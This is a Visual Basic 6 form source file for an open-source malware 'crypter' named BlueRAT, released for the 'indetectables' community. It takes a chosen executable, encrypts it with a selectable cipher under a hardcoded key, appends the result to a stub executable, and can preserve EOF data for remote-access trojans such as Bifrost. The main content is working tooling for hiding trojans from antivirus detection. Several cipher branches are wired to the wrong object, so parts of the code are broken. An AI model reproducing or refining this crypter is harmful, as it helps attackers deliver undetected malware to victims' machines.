VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00C00000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "BlueRAT - Crypter by Kerberos5"
   ClientHeight    =   4365
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   5535
   FillColor       =   &H00C00000&
   ForeColor       =   &H00C00000&
   Icon            =   "crypter.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4365
   ScaleWidth      =   5535
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command4 
      Caption         =   "Exit"
      Height          =   255
      Left            =   4320
      TabIndex        =   16
      Top             =   3840
      Width           =   975
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00C00000&
      BorderStyle     =   0  'None
      FillColor       =   &H00C00000&
      Height          =   1935
      Left            =   0
      Picture         =   "crypter.frx":74F2
      ScaleHeight     =   1935
      ScaleWidth      =   2175
      TabIndex        =   15
      Top             =   120
      Width           =   2175
   End
   Begin VB.OptionButton Option8 
      BackColor       =   &H00C00000&
      Caption         =   "SkipJack"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   4200
      TabIndex        =   13
      Top             =   1800
      Width           =   975
   End
   Begin VB.OptionButton Option7 
      BackColor       =   &H00C00000&
      Caption         =   "Gost"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   2760
      TabIndex        =   12
      Top             =   1800
      Width           =   855
   End
   Begin VB.OptionButton Option6 
      BackColor       =   &H00C00000&
      Caption         =   "TEA"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   4200
      TabIndex        =   11
      Top             =   1440
      Width           =   975
   End
   Begin VB.OptionButton Option5 
      BackColor       =   &H00C00000&
      Caption         =   "TwoFish"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   4200
      TabIndex        =   10
      Top             =   1080
      Width           =   975
   End
   Begin VB.OptionButton Option2 
      BackColor       =   &H00C00000&
      Caption         =   "BlowFish"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   2760
      TabIndex        =   9
      Top             =   1080
      Width           =   1215
   End
   Begin VB.OptionButton Option4 
      BackColor       =   &H00C00000&
      Caption         =   "RC4"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   2760
      TabIndex        =   7
      Top             =   1440
      Width           =   1095
   End
   Begin VB.OptionButton Option3 
      BackColor       =   &H00C00000&
      Caption         =   "DES"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   4200
      TabIndex        =   6
      Top             =   720
      Width           =   975
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   255
      Left            =   3360
      TabIndex        =   5
      Top             =   3840
      Width           =   855
   End
   Begin MSComDlg.CommonDialog ki 
      Left            =   960
      Top             =   1920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cm 
      Left            =   360
      Top             =   1920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   1560
      Top             =   1920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H00C00000&
      Caption         =   "EOF Data"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   360
      TabIndex        =   4
      Top             =   3720
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypt"
      Height          =   375
      Left            =   3360
      TabIndex        =   3
      Top             =   3240
      Width           =   1935
   End
   Begin VB.OptionButton Option1 
      BackColor       =   &H00C00000&
      Caption         =   "ClsCryptAPI"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   2760
      TabIndex        =   2
      Top             =   720
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Select"
      Height          =   285
      Left            =   4200
      TabIndex        =   1
      Top             =   2640
      Width           =   1095
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   0
      Top             =   2640
      Width           =   3735
   End
   Begin VB.Line Line8 
      BorderColor     =   &H0000FFFF&
      X1              =   3120
      X2              =   3120
      Y1              =   3240
      Y2              =   4080
   End
   Begin VB.Line Line7 
      BorderColor     =   &H0000FFFF&
      X1              =   240
      X2              =   240
      Y1              =   3240
      Y2              =   4080
   End
   Begin VB.Line Line6 
      BorderColor     =   &H0000FFFF&
      X1              =   240
      X2              =   3120
      Y1              =   4080
      Y2              =   4080
   End
   Begin VB.Line Line5 
      BorderColor     =   &H0000FFFF&
      X1              =   240
      X2              =   3120
      Y1              =   3240
      Y2              =   3240
   End
   Begin VB.Line Line4 
      BorderColor     =   &H0000FFFF&
      X1              =   5280
      X2              =   2640
      Y1              =   2160
      Y2              =   2160
   End
   Begin VB.Line Line3 
      BorderColor     =   &H0000FFFF&
      X1              =   2640
      X2              =   2640
      Y1              =   240
      Y2              =   2160
   End
   Begin VB.Line Line2 
      BorderColor     =   &H0000FFFF&
      X1              =   5280
      X2              =   5280
      Y1              =   240
      Y2              =   2160
   End
   Begin VB.Line Line1 
      BorderColor     =   &H0000FFFF&
      X1              =   2640
      X2              =   5280
      Y1              =   240
      Y2              =   240
   End
   Begin VB.Label Label2 
      BackColor       =   &H00C00000&
      Caption         =   "Support EoF Data (ex. Bifrost)"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   360
      TabIndex        =   14
      Top             =   3360
      Width           =   2655
   End
   Begin VB.Label Label1 
      BackColor       =   &H00C00000&
      Caption         =   "Encrypt Mode:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   2760
      TabIndex        =   8
      Top             =   360
      Width           =   1455
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'|||||||||||||||||||||||||||||||||||||||||||
'Ejemplo source de crypter by m3m0_11
'Podra ser posteado en cualquier lado siempre conservando el nombre del autor
'|||||||||||||||||||||||||||||||||||||||||||

Const u = "gdsa·$&/ADSFSDHADF)P(ñp8o´&%IP)(&Ksfdahdfs$&ESDFASDHP/(GASDHGAS)%TagYEFFAHADFJDGL /asgsdfSDAa*=)jfgASDGASsjkhf/)O%$&(K~¬€¬kjdhgkghdkdg¬&%(=hadhdfga=$·&gjhsdfjsa/"
Private Sub Command1_Click()
With cm
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija el archivo a encryptar.."
.ShowOpen
End With
Text1.Text = cm.Filename
End Sub

Private Sub Command2_Click()
If cm.Filename = "" Then
MsgBox "Elija un archivo a encryptar!", vbInformation, "m3m0´s Crypter 2.0"
Exit Sub
End If

With cd
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija el Stub.."
.ShowOpen
End With
If cd.Filename = "" Then
MsgBox "Elija el Stub!", vbInformation, "m3m0´s Crypter 2.0"
Exit Sub
End If

With ki
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija donde guardar el archivo encryptado.."
.ShowSave
End With

If Check1.Value = 1 Then
Dim eof As String
eof = ReadEOFData(cm.Filename)
End If




Open cd.Filename For Binary As #1
Dim tub As String
tub = Space(LOF(1) - 1)
Get #1, , tub
Close #1

Open cm.Filename For Binary As #1
Dim se As String
se = Space(LOF(1) - 1)
Get #1, , se
Close #1

Dim es As String, cls As String, sz As New clsCryptAPI

If Option1.Value = True Then
cls = sz.EncryptString(se, u)
es = 1
End If

If Option3.Value = True Then
Dim v As New clsDES
cls = v.EncryptString(se, u)
es = 2
End If

If Option4.Value = True Then
Dim C As New clsRC4
cls = C.EncryptString(se, u)
es = 3
End If

If Option2.Value = True Then
Dim b As New clsBlowFish
cls = C.EncryptString(se, u)
es = 4
End If

If Option5.Value = True Then
Dim T As New clsTwoFish
cls = C.EncryptString(se, u)
es = 5
End If

If Option6.Value = True Then
Dim H As New clsTEA
cls = C.EncryptString(se, u)
es = 6
End If

If Option7.Value = True Then
Dim G As New clsGost
cls = C.EncryptString(se, u)
es = 7
End If

If Option8.Value = True Then
Dim S As New clsSkipJack
cls = C.EncryptString(se, u)
es = 8
End If

Open ki.Filename For Binary As #4
Put #4, , tub & u
Put #4, , es & u
Put #4, , cls & u
Close #4

If Check1.Value = 1 Then

Call WriteEOFData(ki.Filename, eof)

End If

MsgBox "File crypted!", vbInformation, "m3m0´s Crypter 2.0"


End Sub

Private Sub Command3_Click()
MsgBox "Simple crypter created by m3m0_11 ..::Open source edition::..  for indetectables comunity", vbInformation, "Modded by Kerberos6"

End Sub

Private Sub Command4_Click()
End
End Sub

Private Sub Form_Load()
Option1.Value = True
End Sub
